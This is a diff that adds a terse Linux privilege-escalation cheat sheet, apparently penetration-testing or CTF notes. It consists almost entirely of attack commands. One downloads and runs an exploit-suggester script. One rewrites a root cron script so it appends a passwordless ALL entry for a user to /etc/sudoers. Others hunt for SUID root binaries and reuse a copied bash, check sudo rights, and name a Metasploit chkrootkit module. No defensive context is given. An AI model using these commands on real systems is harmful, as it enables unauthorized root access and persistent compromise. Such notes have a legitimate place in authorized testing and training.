@@ -1,0 +1,20 @@
+# LES
+    wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+    chmod +x les.sh
+    ./les.sh
+
+# Cron
+    # Add to sudoers
+    printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>
+
+# SUID
+    find / -type f -perm -u=s -user root 2>/dev/null
+    # Bash
+    cp /bin/bash <FILE>
+    ./<FILE>
+
+# Sudo
+    sudo -l
+
+# metasploit chkrootkit binary
+    exploit/unix/local/chkrootkit
